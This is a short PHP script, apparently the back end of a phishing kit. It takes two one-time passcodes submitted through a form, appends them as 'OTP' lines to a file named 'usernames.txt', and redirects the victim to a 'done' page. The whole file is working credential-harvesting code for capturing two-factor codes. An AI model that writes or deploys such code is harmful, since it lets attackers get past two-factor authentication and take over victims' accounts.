<?php
file_put_contents("usernames.txt", "OTP: " . $_POST["phone_code"] . "\n", FILE_APPEND);
file_put_contents("usernames.txt", "OTP2: " . $_POST["phone_code2"] . "\n", FILE_APPEND);
header('Location: done.php');
exit();
?>

